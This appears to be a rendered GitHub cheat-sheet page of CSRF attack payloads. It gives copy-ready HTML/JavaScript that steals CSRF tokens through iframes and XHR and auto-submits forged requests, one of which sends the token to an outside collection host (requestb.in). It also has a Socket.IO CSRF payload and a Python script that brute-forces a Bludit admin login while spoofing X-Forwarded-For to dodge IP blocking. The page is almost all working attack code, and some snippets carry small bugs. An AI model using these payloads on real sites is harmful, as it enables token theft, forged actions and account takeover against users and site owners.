<h3 dir="auto"><a id="user-content-steal-csrf-token-and-sen-a-post-request-using-an-iframe-and-a-form" class="anchor" aria-hidden="true" href="#steal-csrf-token-and-sen-a-post-request-using-an-iframe-and-a-form"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><strong>Steal CSRF Token and sen a POST request using an iframe and a form</strong></h3>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre lang="markup"><code>&lt;iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"&gt;&lt;/iframe&gt;

&lt;script&gt; 
function read()
{
    var name = 'admin2';
    var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
    document.writeln('&lt;form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data"&gt;');
    document.writeln('&lt;input id="username" type="text" name="username" value="' + name + '" /&gt;&lt;br /&gt;');
    document.writeln('&lt;input id="token" type="hidden" name="token" value="' + token + '" /&gt;');
    document.writeln('&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;br/&gt;');
    document.writeln('&lt;/form&gt;');
    document.forms[0].submit.click();
}
&lt;/script&gt;
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<iframe id=&quot;iframe&quot; src=&quot;http://google.com?param=VALUE&quot; width=&quot;500&quot; height=&quot;500&quot; onload=&quot;read()&quot;></iframe>

<script> 
function read()
{
    var name = 'admin2';
    var token = document.getElementById(&quot;iframe&quot;).contentDocument.forms[0].token.value;
    document.writeln('<form width=&quot;0&quot; height=&quot;0&quot; method=&quot;post&quot; action=&quot;http://www.yoursebsite.com/check.php&quot;  enctype=&quot;multipart/form-data&quot;>');
    document.writeln('<input id=&quot;username&quot; type=&quot;text&quot; name=&quot;username&quot; value=&quot;' + name + '&quot; /><br />');
    document.writeln('<input id=&quot;token&quot; type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;' + token + '&quot; />');
    document.writeln('<input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /><br/>');
    document.writeln('</form>');
    document.forms[0].submit.click();
}
</script>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<h3 dir="auto"><a id="user-content-steal-token-and-send-it-using-2-iframes" class="anchor" aria-hidden="true" href="#steal-token-and-send-it-using-2-iframes"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><strong>Steal token and send it using 2 iframes</strong></h3>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre lang="markup"><code>&lt;script&gt;
var token;
function readframe1(){
  token = frame1.document.getElementById("profile").token.value;
  document.getElementById("bypass").token.value = token
  loadframe2();
}
function loadframe2(){
  var test = document.getElementbyId("frame2");
  test.src = "http://requestb.in/1g6asbg1?token="+token;
}
&lt;/script&gt;

&lt;iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"&gt;&lt;/iframe&gt;

&lt;iframe id="frame2" name="frame2" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"&gt;&lt;/iframe&gt;
&lt;body onload="document.forms[0].submit()"&gt;
&lt;form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data"&gt;
  &lt;input type="text" name="username" value="z"&gt;
  &lt;input type="checkbox" name="status" checked=""&gt;        
  &lt;input id="token" type="hidden" name="token" value="0000" /&gt;
  &lt;button type="submit"&gt;Submit&lt;/button&gt;
&lt;/form&gt;
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<script>
var token;
function readframe1(){
  token = frame1.document.getElementById(&quot;profile&quot;).token.value;
  document.getElementById(&quot;bypass&quot;).token.value = token
  loadframe2();
}
function loadframe2(){
  var test = document.getElementbyId(&quot;frame2&quot;);
  test.src = &quot;http://requestb.in/1g6asbg1?token=&quot;+token;
}
</script>

<iframe id=&quot;frame1&quot; name=&quot;frame1&quot; src=&quot;http://google.com?param=VALUE&quot; onload=&quot;readframe1()&quot; 
sandbox=&quot;allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation&quot;
height=&quot;600&quot; width=&quot;800&quot;></iframe>

<iframe id=&quot;frame2&quot; name=&quot;frame2&quot; 
sandbox=&quot;allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation&quot;
height=&quot;600&quot; width=&quot;800&quot;></iframe>
<body onload=&quot;document.forms[0].submit()&quot;>
<form id=&quot;bypass&quot; name&quot;bypass&quot; method=&quot;POST&quot; target=&quot;frame2&quot; action=&quot;http://google.com?param=VALUE&quot; enctype=&quot;multipart/form-data&quot;>
  <input type=&quot;text&quot; name=&quot;username&quot; value=&quot;z&quot;>
  <input type=&quot;checkbox&quot; name=&quot;status&quot; checked=&quot;&quot;>        
  <input id=&quot;token&quot; type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;0000&quot; />
  <button type=&quot;submit&quot;>Submit</button>
</form>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<h3 dir="auto"><a id="user-content-poststeal-csrf-token-with-ajax-and-send-a-post-with-a-form" class="anchor" aria-hidden="true" href="#poststeal-csrf-token-with-ajax-and-send-a-post-with-a-form"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><strong>POSTSteal CSRF token with Ajax and send a post with a form</strong></h3>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre lang="markup"><code>&lt;body onload="getData()"&gt;

&lt;form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data"&gt;
  &lt;input type="hidden" name="username" value="root"/&gt;
  &lt;input type="hidden" name="status" value="on"/&gt;
  &lt;input type="hidden" id="findtoken" name="token" value=""/&gt;
  &lt;input type="submit" value="valider"/&gt;
&lt;/form&gt;

&lt;script&gt;
var x = new XMLHttpRequest();
function getData() {
  x.withCredentials = true;
  x.open("GET","http://google.com?param=VALUE",true);
  x.send(null); 
}
x.onreadystatechange = function() {
  if (x.readyState == XMLHttpRequest.DONE) {
    var token = x.responseText.match(/name="token" value="(.+)"/)[1];
    document.getElementById("findtoken").value = token;
    document.getElementById("form").submit();
  }
}
&lt;/script&gt;
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<body onload=&quot;getData()&quot;>

<form id=&quot;form&quot; action=&quot;http://google.com?param=VALUE&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;>
  <input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;root&quot;/>
  <input type=&quot;hidden&quot; name=&quot;status&quot; value=&quot;on&quot;/>
  <input type=&quot;hidden&quot; id=&quot;findtoken&quot; name=&quot;token&quot; value=&quot;&quot;/>
  <input type=&quot;submit&quot; value=&quot;valider&quot;/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
  x.withCredentials = true;
  x.open(&quot;GET&quot;,&quot;http://google.com?param=VALUE&quot;,true);
  x.send(null); 
}
x.onreadystatechange = function() {
  if (x.readyState == XMLHttpRequest.DONE) {
    var token = x.responseText.match(/name=&quot;token&quot; value=&quot;(.+)&quot;/)[1];
    document.getElementById(&quot;findtoken&quot;).value = token;
    document.getElementById(&quot;form&quot;).submit();
  }
}
</script>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<h3 dir="auto"><a id="user-content-csrf-with-socketio" class="anchor" aria-hidden="true" href="#csrf-with-socketio"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>CSRF with Socket.IO</h3>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre lang="markup"><code>&lt;script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"&gt;&lt;/script&gt;
&lt;script&gt;
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () =&gt; {
    console.log('connected!');
    socket.emit('join', {
        room: username
    });
  socket.emit('my_room_event', {
      data: '!flag',
      room: username
  })

});
&lt;/script&gt;
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<script src=&quot;https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js&quot;></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
    console.log('connected!');
    socket.emit('join', {
        room: username
    });
  socket.emit('my_room_event', {
      data: '!flag',
      room: username
  })

});
</script>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<h2 dir="auto"><a id="user-content-csrf-login-brute-force" class="anchor" aria-hidden="true" href="#csrf-login-brute-force"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>CSRF Login Brute Force</h2>
<p dir="auto">The code can be used to Brut Force a login form using a CSRF token (It's also using the header X-Forwarded-For to try to bypass a possible IP blacklisting):</p>
<div class="highlight highlight-source-python position-relative overflow-auto"><pre><span class="pl-k">import</span> <span class="pl-s1">request</span>
<span class="pl-k">import</span> <span class="pl-s1">re</span>
<span class="pl-k">import</span> <span class="pl-s1">random</span>

<span class="pl-v">URL</span> <span class="pl-c1">=</span> <span class="pl-s">"http://10.10.10.191/admin/"</span>
<span class="pl-v">PROXY</span> <span class="pl-c1">=</span> { <span class="pl-s">"http"</span>: <span class="pl-s">"127.0.0.1:8080"</span>}
<span class="pl-v">SESSION_COOKIE_NAME</span> <span class="pl-c1">=</span> <span class="pl-s">"BLUDIT-KEY"</span>
<span class="pl-v">USER</span> <span class="pl-c1">=</span> <span class="pl-s">"fergus"</span>
<span class="pl-v">PASS_LIST</span><span class="pl-c1">=</span><span class="pl-s">"./words"</span>

<span class="pl-k">def</span> <span class="pl-en">init_session</span>():
    <span class="pl-c">#Return CSRF + Session (cookie)</span>
    <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-en">get</span>(<span class="pl-v">URL</span>)
    <span class="pl-s1">csrf</span> <span class="pl-c1">=</span> <span class="pl-s1">re</span>.<span class="pl-en">search</span>(<span class="pl-s">r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"'</span>, <span class="pl-s1">r</span>.<span class="pl-s1">text</span>)
    <span class="pl-s1">csrf</span> <span class="pl-c1">=</span> <span class="pl-s1">csrf</span>.<span class="pl-en">group</span>(<span class="pl-c1">1</span>)
    <span class="pl-s1">session_cookie</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-s1">cookies</span>.<span class="pl-en">get</span>(<span class="pl-v">SESSION_COOKIE_NAME</span>)
    <span class="pl-k">return</span> <span class="pl-s1">csrf</span>, <span class="pl-s1">session_cookie</span>

<span class="pl-k">def</span> <span class="pl-en">login</span>(<span class="pl-s1">user</span>, <span class="pl-s1">password</span>):
    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">user</span><span class="pl-kos">}</span></span>:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">password</span><span class="pl-kos">}</span></span>"</span>)
    <span class="pl-s1">csrf</span>, <span class="pl-s1">cookie</span> <span class="pl-c1">=</span> <span class="pl-en">init_session</span>()
    <span class="pl-s1">cookies</span> <span class="pl-c1">=</span> {<span class="pl-v">SESSION_COOKIE_NAME</span>: <span class="pl-s1">cookie</span>}
    <span class="pl-s1">data</span> <span class="pl-c1">=</span> {
        <span class="pl-s">"tokenCSRF"</span>: <span class="pl-s1">csrf</span>,
        <span class="pl-s">"username"</span>: <span class="pl-s1">user</span>,
        <span class="pl-s">"password"</span>: <span class="pl-s1">password</span>,
        <span class="pl-s">"save"</span>: <span class="pl-s">""</span>
    }
    <span class="pl-s1">headers</span> <span class="pl-c1">=</span> {
        <span class="pl-s">"X-Forwarded-For"</span>: <span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">random</span>.<span class="pl-en">randint</span>(<span class="pl-c1">1</span>,<span class="pl-c1">256</span>)<span class="pl-kos">}</span></span>.<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">random</span>.<span class="pl-en">randint</span>(<span class="pl-c1">1</span>,<span class="pl-c1">256</span>)<span class="pl-kos">}</span></span>.<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">random</span>.<span class="pl-en">randint</span>(<span class="pl-c1">1</span>,<span class="pl-c1">256</span>)<span class="pl-kos">}</span></span>.<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">random</span>.<span class="pl-en">randint</span>(<span class="pl-c1">1</span>,<span class="pl-c1">256</span>)<span class="pl-kos">}</span></span>"</span>
    }
    <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-en">post</span>(<span class="pl-v">URL</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">data</span>, <span class="pl-s1">cookies</span><span class="pl-c1">=</span><span class="pl-s1">cookies</span>, <span class="pl-s1">headers</span><span class="pl-c1">=</span><span class="pl-s1">headers</span>, <span class="pl-s1">proxies</span><span class="pl-c1">=</span><span class="pl-v">PROXY</span>)
    <span class="pl-k">if</span> <span class="pl-s">"Username or password incorrect"</span> <span class="pl-c1">in</span> <span class="pl-s1">r</span>.<span class="pl-s1">text</span>:
        <span class="pl-k">return</span> <span class="pl-c1">False</span>
    <span class="pl-k">else</span>:
        <span class="pl-en">print</span>(<span class="pl-s">f"FOUND <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">user</span><span class="pl-kos">}</span></span> : <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">password</span><span class="pl-kos">}</span></span>"</span>)
        <span class="pl-k">return</span> <span class="pl-c1">True</span>

<span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-v">PASS_LIST</span>, <span class="pl-s">"r"</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
    <span class="pl-k">for</span> <span class="pl-s1">line</span> <span class="pl-c1">in</span> <span class="pl-s1">f</span>:
        <span class="pl-en">login</span>(<span class="pl-v">USER</span>, <span class="pl-s1">line</span>.<span class="pl-en">strip</span>())</pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="import request
import re
import random

URL = &quot;http://10.10.10.191/admin/&quot;
PROXY = { &quot;http&quot;: &quot;127.0.0.1:8080&quot;}
SESSION_COOKIE_NAME = &quot;BLUDIT-KEY&quot;
USER = &quot;fergus&quot;
PASS_LIST=&quot;./words&quot;

def init_session():
    #Return CSRF + Session (cookie)
    r = requests.get(URL)
    csrf = re.search(r'input type=&quot;hidden&quot; id=&quot;jstokenCSRF&quot; name=&quot;tokenCSRF&quot; value=&quot;([a-zA-Z0-9]*)&quot;', r.text)
    csrf = csrf.group(1)
    session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
    return csrf, session_cookie

def login(user, password):
    print(f&quot;{user}:{password}&quot;)
    csrf, cookie = init_session()
    cookies = {SESSION_COOKIE_NAME: cookie}
    data = {
        &quot;tokenCSRF&quot;: csrf,
        &quot;username&quot;: user,
        &quot;password&quot;: password,
        &quot;save&quot;: &quot;&quot;
    }
    headers = {
        &quot;X-Forwarded-For&quot;: f&quot;{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}&quot;
    }
    r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
    if &quot;Username or password incorrect&quot; in r.text:
        return False
    else:
        print(f&quot;FOUND {user} : {password}&quot;)
        return True

with open(PASS_LIST, &quot;r&quot;) as f:
    for line in f:
        login(USER, line.strip())
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
